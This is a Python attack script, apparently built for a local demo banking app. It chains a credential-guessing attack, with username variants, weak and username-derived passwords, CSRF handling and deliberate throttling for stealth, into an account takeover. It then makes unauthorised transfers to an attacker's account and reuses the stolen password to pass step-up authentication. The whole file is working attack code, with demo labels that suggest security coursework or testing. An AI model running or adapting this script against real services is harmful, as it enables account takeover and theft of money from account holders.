import re
import time
import requests
from typing import Optional, Tuple

BASE_URL = "http://127.0.0.1:5000"
LOGIN_URL = f"{BASE_URL}/login"
TRANSFER_URL = f"{BASE_URL}/transfer"
TRANSACTIONS_URL = f"{BASE_URL}/transactions"

# =========================
# Target identity seeds
# =========================
USERNAMES = ["alice", "bob", "carol"]

# Common weak password dictionary
COMMON_PASSWORDS = [
    "123456",
    "password",
    "qwerty",
    "admin",
    "admin123",
    "letmein",
    "welcome",
    "test123",
]

USERNAME_FIELD = "username"
PASSWORD_FIELD = "password"
CSRF_FIELD = "csrf_token"


SUCCESS_KEYWORDS = [
    "dashboard",
    "welcome",
    "logout",
    "balance",
    "transaction",
    "account",
]

FAIL_KEYWORDS = [
    "invalid",
    "incorrect",
    "failed",
    "error",
]


DELAY = 0.5
TIMEOUT = 5


ATTACKER_USERNAME = "mallory"

# Start with a standard-sized bet, then place a high-risk bet
NORMAL_TRANSFER_AMOUNT = "50.00"
HIGH_RISK_TRANSFER_AMOUNT = "800.00"

TRANSFER_NOTE_NORMAL = "Unauthorised transfer demo"
TRANSFER_NOTE_HIGH = "High-risk unauthorised transfer demo"


# =========================
# Credential attack helpers
# =========================
def extract_csrf_token(html: str) -> Optional[str]:
    pattern = r'name=["\']csrf_token["\']\s+value=["\']([^"\']+)["\']'
    match = re.search(pattern, html, re.IGNORECASE)
    if match:
        return match.group(1)

    pattern = r'value=["\']([^"\']+)["\']\s+name=["\']csrf_token["\']'
    match = re.search(pattern, html, re.IGNORECASE)
    if match:
        return match.group(1)

    return None


def fetch_csrf_token(session: requests.Session, url: str) -> Optional[str]:
    response = session.get(url, timeout=TIMEOUT)
    return extract_csrf_token(response.text)


def generate_username_candidates() -> list[str]:
    """
    Generate plausible username candidates instead of relying only on a fixed list.
    This makes the first phase look more like username guessing/enumeration.
    """
    seen = set()
    result = []

    for identity in USERNAMES:
        patterns = [
            identity,
            identity.lower(),
            identity.capitalize(),
            f"{identity}1",
            f"{identity}01",
            f"{identity}_user",
            f"{identity}.user",
            f"{identity}@example.com",
        ]

        for candidate in patterns:
            normalised = candidate.strip()
            if normalised and normalised not in seen:
                seen.add(normalised)
                result.append(normalised)

    return result


def generate_password_candidates(username: str) -> list[str]:
    """
    Generate password candidates by combining common weak passwords with username-based rules.
    This makes the attack more realistic, rather than relying on a ‘known correct password’.
    """
    pattern_passwords = [
        f"{username}123",
        f"{username}2024",
        f"{username}2025",
        f"{username}@123",
        f"{username}1234",
    ]

    seen = set()
    result = []

    for pwd in COMMON_PASSWORDS + pattern_passwords:
        if pwd not in seen:
            seen.add(pwd)
            result.append(pwd)

    return result


def is_login_success(response: requests.Response) -> bool:
    """
    Checking whether login was successful:
    1. Whether the user has been redirected to /dashboard (most reliable)
    2. Whether a clear error message has been returned
    """

    # once you’ve logged in successfully, you’ll be redirected to the dashboard
    if "/dashboard" in response.url:
        return True

    text = response.text.lower()

    # Clear failure messages
    if "invalid username or password" in text:
        return False

    if "please log in first" in text:
        return False

    #  If you are still on the login page, this indicates that the attempt has failed
    if "/login" in response.url:
        return False

    # Assume failure by default (to avoid false positives)
    return False


def try_login(session: requests.Session, username: str, password: str) -> bool:
    csrf_token = fetch_csrf_token(session, LOGIN_URL)
    data = {
        USERNAME_FIELD: username,
        PASSWORD_FIELD: password,
    }
    if csrf_token:
        data[CSRF_FIELD] = csrf_token

    response = session.post(
        LOGIN_URL,
        data=data,
        timeout=TIMEOUT,
        allow_redirects=True,
    )
    return is_login_success(response)


def credential_attack(session: requests.Session) -> Optional[Tuple[str, str]]:
    print("[*] Attack phase 1: credential-based account takeover")
    print(f"[*] Target login endpoint: {LOGIN_URL}")
    print("[*] Strategy: guessed usernames + common weak passwords + username-based password patterns")
    print("[*] Slow mode enabled to simulate stealthier login testing")
    username_candidates = generate_username_candidates()
    print(f"[*] Generated {len(username_candidates)} username candidates")
    print("[*] The script will continue across the full username list to show enumeration coverage")

    discovered_credentials: list[Tuple[str, str]] = []
    for username in username_candidates:
        print(f"\n[*] Testing username candidate: {username}")
        password_candidates = generate_password_candidates(username)
        print(f"[*] Generated {len(password_candidates)} password candidates for username={username}")

        for password in password_candidates:
            try:
                print(f"[*] Trying username={username}, password={password}")
                ok = try_login(session, username, password)

                if ok:
                    print(f"[+] SUCCESS: username={username}, password={password}")
                    discovered_credentials.append((username, password))
                    print("[*] Continuing to test the remaining username candidates for demo purposes")
                    break

                print("[-] Failed")
                time.sleep(DELAY)

            except requests.RequestException as e:
                print(f"[!] Request error: {e}")
                time.sleep(DELAY)

    if discovered_credentials:
        print("\n[*] Credential attack summary")
        for username, password in discovered_credentials:
            print(f"[+] Valid credential discovered: {username} / {password}")
        return discovered_credentials[0]

    print("[*] Finished. No valid credentials found.")
    return None


# =========================
# Transfer attack helpers
# =========================
def extract_mallory_account_id(html: str) -> Optional[str]:
    """
    Retrieve the account_id corresponding to “mallory” from the transfer page.
    """
    pattern = r'<option\s+value="(\d+)"[^>]*>[^<]*mallory[^<]*</option>'
    match = re.search(pattern, html, re.IGNORECASE)
    if match:
        return match.group(1)
    return None


def preview_transfer(
    session: requests.Session,
    to_account_id: str,
    amount: str,
    note: str,
) -> Optional[str]:
    csrf_token = fetch_csrf_token(session, TRANSFER_URL)
    data = {
        "to_account_id": to_account_id,
        "amount": amount,
        "note": note,
        "action": "preview",
    }
    if csrf_token:
        data[CSRF_FIELD] = csrf_token

    response = session.post(
        TRANSFER_URL,
        data=data,
        timeout=TIMEOUT,
        allow_redirects=True,
    )

    text = response.text.lower()
    if "projected balance" in text or "risk" in text or "preview" in text:
        print(f"[+] Preview succeeded for transfer to account_id={to_account_id}, amount=£{amount}")
        return extract_csrf_token(response.text) or csrf_token or ""

    print("[-] Preview may have failed")
    print(response.text[:500])
    return None


def confirm_transfer(
    session: requests.Session,
    to_account_id: str,
    amount: str,
    note: str,
    csrf_token: Optional[str],
    step_up_password: str | None,
) -> bool:
    data = {
        "to_account_id": to_account_id,
        "amount": amount,
        "note": note,
        "action": "confirm",
    }
    if csrf_token:
        data[CSRF_FIELD] = csrf_token
    if step_up_password:
        data["step_up_password"] = step_up_password

    response = session.post(
        TRANSFER_URL,
        data=data,
        timeout=TIMEOUT,
        allow_redirects=True,
    )

    text = response.text.lower()
    if "transfer completed successfully" in text or "transactions" in text:
        print(f"[+] Transfer completed: £{amount} -> {ATTACKER_USERNAME}")
        return True

    print("[-] Confirm transfer may have failed")
    print(response.text[:500])
    return False


def check_transactions_page(session: requests.Session, note: str) -> None:
    response = session.get(TRANSACTIONS_URL, timeout=TIMEOUT)
    text = response.text.lower()

    print("[*] Transactions page checked")
    if ATTACKER_USERNAME in text or note.lower() in text:
        print("[+] Evidence found in transactions page")
    else:
        print("[-] Could not clearly confirm from transactions page text")


def run_transfer_flow(
    session: requests.Session,
    mallory_account_id: str,
    amount: str,
    note: str,
    step_up_password: str | None,
) -> bool:
    print(f"[*] Starting transfer abuse attempt: £{amount} -> {ATTACKER_USERNAME}")
    if step_up_password:
        print("[*] Reusing captured password for step-up authentication if required")
    else:
        print("[!] Step-up authentication may block this transfer if an extra password is required")

    csrf_token = preview_transfer(session, mallory_account_id, amount, note)
    if csrf_token is None:
        return False

    if not confirm_transfer(session, mallory_account_id, amount, note, csrf_token, step_up_password):
        return False

    check_transactions_page(session, note)
    return True


def unauthorised_transfer_attack(session: requests.Session, victim_username: str, victim_password: str) -> None:
    print("[*] Attack phase 2: financial abuse through unauthorised transfer")
    print(f"[+] Logged in as victim: {victim_username}")
    print("[*] Attack chain: credential compromise -> account takeover -> transfer abuse")

    transfer_page = session.get(TRANSFER_URL, timeout=TIMEOUT)
    mallory_account_id = extract_mallory_account_id(transfer_page.text)

    if not mallory_account_id:
        print("[-] Could not find mallory account ID from /transfer page")
        print(transfer_page.text[:1000])
        return

    print(f"[+] Found mallory account_id = {mallory_account_id}")

    # First entry: Standard amount
    print("\n[*] Step 2A: normal-value unauthorised transfer")
    normal_ok = run_transfer_flow(
        session=session,
        mallory_account_id=mallory_account_id,
        amount=NORMAL_TRANSFER_AMOUNT,
        note=TRANSFER_NOTE_NORMAL,
        step_up_password=victim_password,
    )

    # Item 2: High-risk amount
    print("\n[*] Step 2B: high-risk unauthorised transfer")
    high_ok = run_transfer_flow(
        session=session,
        mallory_account_id=mallory_account_id,
        amount=HIGH_RISK_TRANSFER_AMOUNT,
        note=TRANSFER_NOTE_HIGH,
        step_up_password=victim_password,
    )

    print("\n[*] Transfer attack summary")
    print(f"[*] Normal transfer success: {normal_ok}")
    print(f"[*] High-risk transfer success: {high_ok}")

    if high_ok:
        print("[!] High-risk transfer was completed despite elevated risk indicators")
    else:
        print("[*] High-risk transfer did not complete")


# =========================
# Main
# =========================
def main() -> None:
    print("[*] Combined attack started")
    print("[*] Phase 1: credential attack")
    print("[*] Phase 2: unauthorised transfer to attacker-controlled account")
    print()

    session = requests.Session()

    creds = credential_attack(session)
    if creds is None:
        print("[-] Attack stopped: no working credentials obtained")
        return

    victim_username, victim_password = creds
    print()
    print(f"[*] Captured credentials -> {victim_username} / {victim_password}")
    print()

    unauthorised_transfer_attack(session, victim_username, victim_password)

    print()
    print("[*] Combined attack finished")


if __name__ == "__main__":
    main()
